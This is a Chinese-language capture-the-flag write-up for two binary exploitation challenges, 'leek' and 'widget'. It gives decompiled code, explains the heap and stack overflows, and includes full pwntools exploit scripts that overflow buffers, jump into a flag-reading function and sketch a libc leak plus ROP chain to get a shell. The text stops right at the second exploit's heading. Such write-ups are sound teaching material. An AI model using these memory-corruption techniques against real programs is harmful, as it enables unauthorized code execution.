
```c
unsigned \_\_int64 \_\_fastcall input(void \*input\_buffer1)
{
size\_t v1; // rax
char s[1288]; // [rsp+10h] [rbp-510h] BYREF
unsigned \_\_int64 v4; // [rsp+518h] [rbp-8h]
v4 = \_\_readfsqword(0x28u);
fgets(s, 1280, stdin); // 【8】往1288大小的s中输入数据
v1 = strlen(s);
memcpy(input\_buffer1, s, v1); // 【9】将输入拷贝到传入的input\_buffer中，也就是main函数中的v9，这会导致v9堆溢出
return v4 - \_\_readfsqword(0x28u);
}
```

- win

```c
unsigned \_\_int64 win()
{
FILE \*stream; // [rsp+8h] [rbp-98h]
char s[136]; // [rsp+10h] [rbp-90h] BYREF
unsigned \_\_int64 v3; // [rsp+98h] [rbp-8h]
v3 = \_\_readfsqword(0x28u);
stream = fopen("flag.txt", "r");
if ( !stream )
{
puts("Error: missing flag.txt.");
exit(1);
}
fgets(s, 128, stream);
puts(s);
return v3 - \_\_readfsqword(0x28u);
}
```

看完代码，思路就清晰了：`s`和`v9`都指向堆块，两`chunk`连续，且`v9`在`s`上方（地址更低）。很明显，绕过`if`判断有两种方法：1）利用溢出修改`chunk s`，然后输入`s2`的时候溢出的内容；2）利用溢出泄露`chunk s`的内容，然后输入`s2`的时候输入泄露的内容。

`if`判断之后还有一次输入，这次输入能随意？不行，需要利用这次输入修复`chunk s`的`size`，不然执行到`free`的时候你就会发现，`ptmalloc2`会检查`chunk`的`size`：打印`double free or corruption (out)`，并导致程序退出。注意循环`100`次。

## 3.3 exp

```python
from pwn import *
import warnings
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
context.log_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./leek")
p = process("./leek")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
for i in range(100):
# method1
payload = b'a'*(0x20) + b'z'*0x20
sla("): ", payload)
# dbg()
# 下面这里不能使用sla，而需要使用sa。
# 如果用sla，那么输入的字符串长度就是0x22了，即最后两个字符是\n\x00，把前0x21个字符给s2后，缓冲区里还剩1个\x00
# 那么后面执行gets(v9)的时候，从stdin输入的第一个字符就是\x00，那就不能再修复chunk 的size字段了
sa("secret? ", b'z'*0x20)
sla("want: ",b'a'*0x18 + p64(0x31))
# method2
# payload = b'a'*(0x20-1) # 减1是留空间给\n，这样刚好填满chunk s的prev_size和size字段
# sla("): ", payload)
# ru("\n") # 接收刚刚输入的内容
# leak = r(0x20) # 接收chunk s中的随机数
# print(leak)
# sa("secret? ", leak)
# sla("want: ", b'b'*0x18 + p64(0x31))
itr()
```

![image-20230712015632607](upload/attach/202402/830671_Y6X59M5QV5V6M5S.jpg)

# 4 widget

> I seem to have lost my gadgets.

## 4.1 运行

关闭了`Canary`（栈溢出覆盖`ret`简单多了）和`PIE`（不用泄露地址了），开启了`NX`。

```shell
root@5289895e8b8a:/chal# ./widget
Amount: 12
Contents: 2344
Your input: 2344
root@5289895e8b8a:/chal# checksec widget
[*] '/chal/widget'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x400000)
```

## 4.2 反编译

函数列表里又有`win`函数。

- main

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
int amount; // [rsp+Ch] [rbp-24h] BYREF
char buf[24]; // [rsp+10h] [rbp-20h] BYREF buf距离rbp 0x20
__gid_t rgid; // [rsp+28h] [rbp-8h]
unsigned int i; // [rsp+2Ch] [rbp-4h]
setbuf(_bss_start, 0LL);
setbuf(stdin, 0LL);
rgid = getegid();
setresgid(rgid, rgid, rgid);
if ( called )
exit(1);
called = 1; // 这个变量使得main函数只允许执行一次
printf("Amount: ");
amount = 0;
__isoc99_scanf("%d", &amount); // 输入amount
getchar();
if ( amount < 0 ) // amount需要>=0
exit(1);
printf("Contents: ");
read(0, buf, amount); // 读取amount长度的数据到buf
for ( i = 0; (int)i < amount; ++i )
{
if ( buf[i] == 'n' ) // amount长度的buf里不能含有n这个字符
{
printf("bad %d\n", i);
exit(1);
}
}
printf("Your input: ");
return printf(buf); // 格式化字符串漏洞
}
```

- win

```c
int __fastcall win(const char *a1, const char *a2)
{
char s[136]; // [rsp+10h] [rbp-90h] BYREF
FILE *stream; // [rsp+98h] [rbp-8h]
if ( strncmp(a1, "14571414c5d9fe9ed0698ef21065d8a6", 0x20uLL) )// 第一个参数需要等于这个字符串
exit(1);
if ( strncmp(a2, "willy_wonka_widget_factory", 0x1AuLL) )// 第二个参数需要等于这个字符串
exit(1);
stream = fopen("flag.txt", "r"); // 打印flag.txt内容。一样，可以尝试直接跳转到这里来绕过前面的if判断
if ( !stream )
{
puts("Error: missing flag.txt.");
exit(1);
}
fgets(s, 128, stream);
return puts(s);
}
```

理一理思路：
1、利用栈溢出覆盖`main`函数的`ret`为`win`函数中开始读`flag.txt`的地方。
2、看看读`flag.txt`的地方会不会使用到`rbp`，如下面的代码，是会的。

```assembly
.text:000000000040130B loc_40130B: ; CODE XREF: win+69↑j
.text:000000000040130B lea rax, modes ; "r"
.text:0000000000401312 mov rsi, rax ; modes
.text:0000000000401315 lea rax, filename ; "flag.txt"
.text:000000000040131C mov rdi, rax ; filename
.text:000000000040131F call _fopen
.text:0000000000401324 mov [rbp+stream], rax
.text:0000000000401328 cmp [rbp+stream], 0
```

找个可读可写的地址：

```shell
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
Start End Perm Size Offset File
......
0x404000 0x405000 rw-p 1000 3000 /chal/widget
```

这个过程中没有其他阻碍了，非常简单，格式化字符串漏洞也没用到。exp如下。

## 4.3 exp

```python
from pwn import *
import warnings
import subprocess
warnings.filterwarnings(action='ignore', category=BytesWarning)
s = lambda data :p.send(data)
sa = lambda delim,data :p.sendafter(delim, data)
sl = lambda data :p.sendline(data)
sla = lambda delim,data :p.sendlineafter(delim, data)
r = lambda num=4096 :p.recv(num)
ru = lambda delims, drop=True :p.recvuntil(delims, drop)
ruf = lambda delims, drop=False :p.recvuntil(delims, drop)
rl = lambda drop=True :p.recvline(drop)
rlf = lambda drop=False :p.recvline(drop)
uu64 = lambda data :u64(data.ljust(8,'\x00'))
leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr))
logsucc = lambda info :log.success(info)
itr = lambda :p.interactive()
context.clear(arch='amd64') # 【注意1】加上架构信息，不然rop模块会把该程序当成32位程序
context.log_level = 'DEBUG'
#context.terminal=['tmux', 'spilit-window', '-h']
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
def dbg():
gdb.attach(p)
# pause()
elf = ELF("./widget")
p = process("./widget")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# p = remote("","")
# ru("proof of work: ")
# pow = rl()
# sla("solution: ", subprocess.check_output(pow, shell=True, text=True))
sla(b"Amount: ",str(0x30)) # 这个值其实只要够大就可以
payload = b'a'* 0x20 + p64(0x404500) + p64(0x40130B)
sla("Contents: ", payload)
itr()
```

![image-20230712233109988](upload/attach/202402/830671_B7H6ED7QRPM7JW3.jpg)

> 这道题用到了`proof of work`，在上面 `exp` 的注释中记录了相应的接收发送代码。

## 4.4 exp2

还有另一种解法，第一次溢出的时候，利用格式化字符串漏洞泄漏`libc`地址，然后`ret`覆盖为`printf("Amount: ");`的地址，绕过`called`的限制；第二次溢出的时候，`ret`覆盖为`rop`链地址，拿到`shell`，最后`cat flag.txt`。

```assembly
.text:00000000004013D9 loc_4013D9: ; CODE XREF: main+5B↑j <-- 第一次溢出ret选这个地址
.text:00000000004013D9 mov cs:called, 1
.text:00000000004013E3 lea rax, format ; "Amount: "
.text:00000000004013EA mov rdi, rax ; format
.text:00000000004013ED mov eax, 0
.text:00000000004013F2 call _printf
```

这有个问题，`libc`地址怎么泄漏？栈里应该有`libc`的地址，那么利用格式化字符串漏洞可以泄漏出来。而且这个地址应该和`libc`基址的偏移应该是不变的。于是，通过`gdb`计算出这个偏移，然后泄漏出地址，再一算就能拿到`libc`基址了。

![image-20230713005554605](upload/attach/202402/830671_GY3E69HUYBCB5R9.jpg)

所以，偏移是`0x7ff82fb37a37 - 0x7ff82fa23000`

exp如下：
